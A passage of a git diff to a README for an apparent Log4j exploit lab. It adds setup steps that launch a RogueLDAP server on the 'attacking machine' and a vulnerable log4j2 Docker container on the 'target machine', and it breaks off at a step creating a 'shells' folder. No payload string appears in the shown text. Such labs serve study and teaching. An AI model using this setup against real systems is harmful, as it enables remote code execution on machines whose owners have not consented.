@@ -38,12 +38,22 @@ docker run -p 8080:8080 logging-log4j2-vuln
 mvn clean package && java -Dlog4j2.contextSelector=org.apache.logging.log4j.core.async.AsyncLoggerContextSelector -jar logging-log4j2-1.0.jar 
 ```
 
-## Setting up the Environment
+## Setting up the Environment and run the exploit
 
 In order to setup the environment and run the exploit the following steps should be followed 
 
 1. Open a new terminal window and run the ```RogueLDAP``` server at the attacking machine
+
+```
+java -jar RogueLDAP-1.4-SNAPSHOT.jar
+```
+
 2. Open a new terminal window and run the vulnerable ```logging-log4j2``` application at the target machine
+
+```
+docker run -p 8080:8080 logging-log4j2-vuln
+```
+
 3. create a folder called shells at a preffered location at the attacking machine
 
 ```
